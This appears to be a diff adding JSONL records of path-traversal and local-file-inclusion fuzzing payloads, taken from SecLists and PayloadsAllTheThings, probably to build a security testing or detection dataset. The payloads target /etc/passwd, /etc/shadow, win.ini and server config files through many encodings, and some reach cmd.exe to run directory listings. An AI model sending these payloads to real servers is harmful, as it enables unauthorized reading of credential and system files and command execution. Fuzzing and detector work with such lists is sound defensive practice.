+{"payload":"/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:76","license":"MIT"}
+{"payload":"/var/www/localhost/htdocs/.htaccess","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:760","license":"MIT"}
+{"payload":"/var/www/log/error_log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:762","license":"MIT"}
+{"payload":"/../../var/www/logs/access_log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:763","license":"MIT"}
+{"payload":"/var/www/logs/access_log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:764","license":"MIT"}
+{"payload":"/var/www/logs/access.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:765","license":"MIT"}
+{"payload":"../../../../../../../var/www/logs/access_log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:766","license":"MIT"}
+{"payload":"../../../../../../../var/www/logs/access.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:767","license":"MIT"}
+{"payload":"../../../../../var/www/logs/error.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:774","license":"MIT"}
+{"payload":"/var/www/web1/html/.htaccess","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:777","license":"MIT"}
+{"payload":"/Volumes/Macintosh_HD1/opt/apache/conf/httpd.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:779","license":"MIT"}
+{"payload":"/Volumes/Macintosh_HD1/opt/httpd/conf/httpd.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:780","license":"MIT"}
+{"payload":"/Volumes/Macintosh_HD1/usr/local/php4/httpd.conf.php","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:781","license":"MIT"}
+{"payload":"/Volumes/Macintosh_HD1/usr/local/php/httpd.conf.php","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:783","license":"MIT"}
+{"payload":"/Volumes/webBackup/private/etc/httpd/httpd.conf.default","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:787","license":"MIT"}
+{"payload":"C:/Windows/win.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:791","license":"MIT"}
+{"payload":"..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:794","license":"MIT"}
+{"payload":"..2f..2f..2fapache2flogs2ferror.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:804","license":"MIT"}
+{"payload":"..2f..2f..2f..2f..2f..2f..2fvar2fwww2flogs2faccess_log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:810","license":"MIT"}
+{"payload":"..2f..2f..2f..2f..2f..2f..2fvar2fwww2flogs2faccess.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:811","license":"MIT"}
+{"payload":"..2f..2f..2f..2f..2f..2f..2fusr2flocal2fapache2flogs2faccess. log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:813","license":"MIT"}
+{"payload":"..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache22faccess_log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:815","license":"MIT"}
+{"payload":"..2f..2f..2f..2f..2f..2f..2fvar2flog2faccess.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:819","license":"MIT"}
+{"payload":"/C:/inetpub/ftproot/","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:82","license":"MIT"}
+{"payload":"..2f..2f..2f..2f..2f..2f..2fvar2fwww2flogs2ferror_log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:820","license":"MIT"}
+{"payload":"..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache2ferror.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:826","license":"MIT"}
+{"payload":"..2f..2f..2f..2f..2f..2f..2fvar2flog2ferror.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:829","license":"MIT"}
+{"payload":"C:/inetpub/wwwroot/global.asa","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:83","license":"MIT"}
+{"payload":"..2f..2fetc2fpasswd%00","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:833","license":"MIT"}
+{"payload":"..2f..2f..2fetc2fpasswd%00","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:835","license":"MIT"}
+{"payload":"..2f..2f..2f..2fetc2fpasswd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:836","license":"MIT"}
+{"payload":"..2f..2f..2f..2f..2fetc2fpasswd%00","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:839","license":"MIT"}
+{"payload":"C:\\inetpub\\wwwroot\\global.asa","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:84","license":"MIT"}
+{"payload":"..2f..2f..2f..2f..2f..2fetc2fpasswd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:840","license":"MIT"}
+{"payload":"..2f..2f..2f..2f..2f..2fetc2fpasswd%00","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:841","license":"MIT"}
+{"payload":"..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:843","license":"MIT"}
+{"payload":"..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:846","license":"MIT"}
+{"payload":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:848","license":"MIT"}
+{"payload":"c:\\inetpub\\wwwroot\\index.asp","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:85","license":"MIT"}
+{"payload":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:850","license":"MIT"}
+{"payload":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:851","license":"MIT"}
+{"payload":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:852","license":"MIT"}
+{"payload":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:854","license":"MIT"}
+{"payload":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:855","license":"MIT"}
+{"payload":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:856","license":"MIT"}
+{"payload":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:857","license":"MIT"}
+{"payload":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:858","license":"MIT"}
+{"payload":"web.config","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:86","license":"MIT"}
+{"payload":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:860","license":"MIT"}
+{"payload":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:864","license":"MIT"}
+{"payload":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:865","license":"MIT"}
+{"payload":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:866","license":"MIT"}
+{"payload":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:867","license":"MIT"}
+{"payload":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:869","license":"MIT"}
+{"payload":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:871","license":"MIT"}
+{"payload":"L2V0Yy9tYXN0ZXIucGFzc3dk","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:875","license":"MIT"}
+{"payload":"L21hc3Rlci5wYXNzd2Q=","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:876","license":"MIT"}
+{"payload":"ZXRjL3NoYWRvdyUwMA==","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:878","license":"MIT"}
+{"payload":"L2V0Yy9wYXNzd2Q=","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:879","license":"MIT"}
+{"payload":"\\web.config","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:88","license":"MIT"}
+{"payload":"Li4vZXRjL3Bhc3N3ZA==","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:881","license":"MIT"}
+{"payload":"Li4vZXRjL3Bhc3N3ZCUwMA==","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:882","license":"MIT"}
+{"payload":"Li4vLi4vZXRjL3Bhc3N3ZA==","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:883","license":"MIT"}
+{"payload":"Li4vLi4vLi4vZXRjL3Bhc3N3ZA==","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:885","license":"MIT"}
+{"payload":"Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:890","license":"MIT"}
+{"payload":"Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:891","license":"MIT"}
+{"payload":"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:894","license":"MIT"}
+{"payload":"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:895","license":"MIT"}
+{"payload":"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:898","license":"MIT"}
+{"payload":"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:899","license":"MIT"}
+{"payload":"/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:9","license":"MIT"}
+{"payload":"..\\web.config","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:90","license":"MIT"}
+{"payload":"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:900","license":"MIT"}
+{"payload":"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:904","license":"MIT"}
+{"payload":"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:907","license":"MIT"}
+{"payload":"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:908","license":"MIT"}
+{"payload":"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:910","license":"MIT"}
+{"payload":"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:911","license":"MIT"}
+{"payload":"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:913","license":"MIT"}
+{"payload":"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:914","license":"MIT"}
+{"payload":"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:919","license":"MIT"}
+{"payload":"../config.asp","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:92","license":"MIT"}
+{"payload":"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:920","license":"MIT"}
+{"payload":"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:921","license":"MIT"}
+{"payload":"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:922","license":"MIT"}
+{"payload":"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3NoYWRvdyUwMA==","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:924","license":"MIT"}
+{"payload":"..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:926","license":"MIT"}
+{"payload":"..%ef%bc%bc..%ef%bc%bc..%ef%bc%bc..%ef%bc%bc..%ef%bc%bc..%ef%bc%bc..%ef%bc%bcboot.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:929","license":"MIT"}
+{"payload":"///////../../../etc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:930","license":"MIT"}
+{"payload":"config.js","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:97","license":"MIT"}
+{"payload":"\\..\\WINDOWS\\win.ini","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:1","license":"MIT"}
+{"payload":"%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:10","license":"MIT"}
+{"payload":"%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:106","license":"MIT"}
+{"payload":"%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:11","license":"MIT"}
+{"payload":"%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:12","license":"MIT"}
+{"payload":"%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:13","license":"MIT"}
+{"payload":"/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:133","license":"MIT"}
+{"payload":"/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:134","license":"MIT"}
+{"payload":"/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:135","license":"MIT"}
+{"payload":"/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:136","license":"MIT"}
+{"payload":"/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:137","license":"MIT"}
+{"payload":"/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:138","license":"MIT"}
+{"payload":"/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:139","license":"MIT"}
+{"payload":"%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:14","license":"MIT"}
+{"payload":"/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:140","license":"MIT"}
+{"payload":"%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:15","license":"MIT"}
+{"payload":"%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:16","license":"MIT"}
+{"payload":"%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:17","license":"MIT"}
+{"payload":"..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\\","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:18","license":"MIT"}
+{"payload":"..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\\","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:19","license":"MIT"}
+{"payload":"\\..\\..\\WINDOWS\\win.ini","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:2","license":"MIT"}
+{"payload":"..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\\","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:20","license":"MIT"}
+{"payload":"..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\\","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:21","license":"MIT"}
+{"payload":"..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\\","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:22","license":"MIT"}
+{"payload":"..%5c..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\\","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:23","license":"MIT"}
+{"payload":"..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\\","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:24","license":"MIT"}
+{"payload":"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:25","license":"MIT"}
